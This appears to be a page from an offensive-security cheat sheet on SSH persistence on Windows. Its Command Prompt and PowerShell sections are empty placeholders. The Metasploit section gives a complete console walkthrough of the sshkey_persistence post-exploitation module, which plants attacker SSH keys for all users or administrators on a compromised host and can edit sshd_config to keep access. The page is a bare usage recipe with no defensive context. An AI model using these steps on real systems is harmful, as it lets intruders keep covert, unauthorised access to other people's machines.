# SSH

## 01 - Command Prompt

TODO: Fill this info

## 02 - Powershell

TODO: Fill this info

## 03 - Metasploit

```
msf > use post/windows/manage/sshkey_persistence

msf post(windows/manage/sshkey_persistence) > options

Module options (post/windows/manage/sshkey_persistence):

   Name             Current Setting                                    Required  Description
   ----             ---------------                                    --------  -----------
   ADMIN            false                                              yes       Add keys for administrator accounts
   ADMIN_KEY_FILE   C:\ProgramData\ssh\administrators_authorized_keys  yes       Admin key file
   CREATESSHFOLDER  false                                              yes       If no .ssh folder is found, create it for a user
   EDIT_CONFIG      false                                              yes       Edit ssh config to allow public key authentication
   PUBKEY                                                              no        Public Key File to use. (Default: Create a new one)
   SESSION                                                             yes       The session to run this module on
   SSHD_CONFIG      C:\ProgramData\ssh\sshd_config                     yes       sshd_config file
   USERNAME                                                            no        User to add SSH key to (Default: all users on box)

msf post(windows/manage/sshkey_persistence) > set admin <false | true>

msf post(windows/manage/sshkey_persistence) > set admin_key_file <c:\\path\\to\\administrators_authorized_keys>

msf post(windows/manage/sshkey_persistence) > set createsshfolder <false | true>

msf post(windows/manage/sshkey_persistence) > set edit_config <false | true>

msf post(windows/manage/sshkey_persistence) > set sshd_config <c:\\path\\to\\sshd_config>

msf post(windows/manage/sshkey_persistence) > set pubkey [/path/to/file.pub]

msf post(windows/manage/sshkey_persistence) > set username <username>

msf post(windows/manage/sshkey_persistence) > set session <session_id>

msf post(windows/manage/sshkey_persistence) > run
```